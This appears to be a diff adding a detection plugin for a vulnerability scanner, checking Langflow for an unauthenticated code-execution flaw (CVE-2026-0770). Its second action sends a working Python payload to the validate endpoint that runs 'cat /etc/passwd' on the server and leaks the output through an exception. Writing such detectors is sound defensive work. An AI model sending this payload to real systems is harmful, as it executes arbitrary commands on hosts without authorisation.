@@ -1,0 +1,97 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Langflow_CVE_2026_0770"
+  author: "asdfghij"
+  version: "1.0"
+}
+
+finding: {
+  
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2026-0770"
+  }
+
+  severity: CRITICAL
+
+  title: "Langflow exec_globals Remote Code Execution Vulnerability"
+
+  description: "Langflow contains an unauthenticated remote code execution vulnerability caused by improper handling of the exec_globals parameter in the validate endpoint. The flaw results from the inclusion of functionality from an untrusted control sphere (CWE-829). A remote attacker can exploit this vulnerability to execute arbitrary code in the context of root."
+ 
+  recommendation: "Upgrade Langflow to a patched version immediately. Do not expose Langflow instances directly to the internet and restrict access to validation endpoints."
+ 
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2026-0770"
+  }
+
+}
+
+config: {debug: true}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_langflow"
+
+  http_request: {
+    method: GET
+    uri: "/"
+
+    response: {
+      http_status: 200
+
+      expect_all: {
+        conditions: [
+          { body: {} contains: "<title>Langflow</title>"}
+        ]
+      }
+    }
+  }
+}    
+  
+actions: {
+  name: "detect_exec_globals_rce"
+
+  http_request: {
+    method: POST
+    uri: "/api/v1/validate/code"
+
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+
+    data: "{\"code\":\"\\ndef exploit(\\n    _=( lambda r: (_ for _ in ()).throw(Exception(f'OUTPUT:\\\\n{r.stdout}{r.stderr}')) )(\\n        __import__('subprocess').run('cat /etc/passwd', shell=True, capture_output=True, text=True)\\n    )\\n):\\n    pass\\n\"}"
+
+    response: {
+      http_status: 200
+
+      expect_all: {
+        conditions: [
+          { body: {} contains: "root:x:0:0:root" }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+
+  actions: [
+    "fingerprint_langflow",
+    "detect_exec_globals_rce"
+  ]
+}
